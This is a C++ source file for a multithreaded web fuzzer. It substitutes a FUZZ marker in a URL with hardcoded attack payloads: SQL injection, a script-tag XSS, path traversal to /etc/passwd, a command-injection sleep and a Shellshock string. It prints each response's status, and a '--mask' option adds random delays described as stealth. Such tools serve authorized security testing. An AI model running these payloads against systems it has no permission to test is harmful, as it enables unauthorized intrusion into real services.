#include <iostream>
#include <vector>
#include <thread>
#include <mutex>
#include <string>
#include <algorithm>
#include "network_core.hpp"

std::mutex result_mtx;
bool verbose_mode = false;
bool mask_mode = false;

void worker(const std::string& base_url, const std::string& payload) {
    NetworkCore net;
    long status = 0;
    std::string target = base_url;
    size_t pos = target.find("FUZZ");
    if (pos != std::string::npos) {
        target.replace(pos, 4, payload);
    }

    if (mask_mode) {
        // High anonymity technique: Add randomized delay
        std::this_thread::sleep_for(std::chrono::milliseconds(rand() % 500));
    }

    std::string body = net.send_request(target, status);
    
    if (status > 0) {
        std::lock_guard<std::mutex> lock(result_mtx);
        if (verbose_mode) {
            std::cout << "[*] PROBE: " << target << " -> HTTP " << status << std::endl;
        }
        std::cout << "{\"status\":" << status << ",\"len\":" << body.length() 
                  << ",\"url\":\"" << target << "\",\"payload\":\"" << payload << "\"}" << std::endl;
    }
}

int main(int argc, char* argv[]) {
    if (argc < 2) return 1;
    std::string url = argv[1];
    
    for (int i = 1; i < argc; ++i) {
        std::string arg = argv[i];
        if (arg == "-v") verbose_mode = true;
        if (arg == "--mask") mask_mode = true;
    }

    if (verbose_mode) {
        std::cout << "[*] C++ Fast Fuzzer v2.2: Initializing high-efficiency engine..." << std::endl;
        if (mask_mode) std::cout << "[*] MASK ON: Stealth mode enabled." << std::endl;
    }

    std::vector<std::string> payloads = {
        "' OR 1=1--", "admin'--", "<script>alert(1)</script>",
        "../../etc/passwd", "%;sleep 5", "() { :; }; echo 'VULN'"
    };

    std::vector<std::thread> threads;
    for (const auto& p : payloads) {
        threads.emplace_back(worker, url, p);
    }

    for (auto& t : threads) t.join();
    return 0;
}
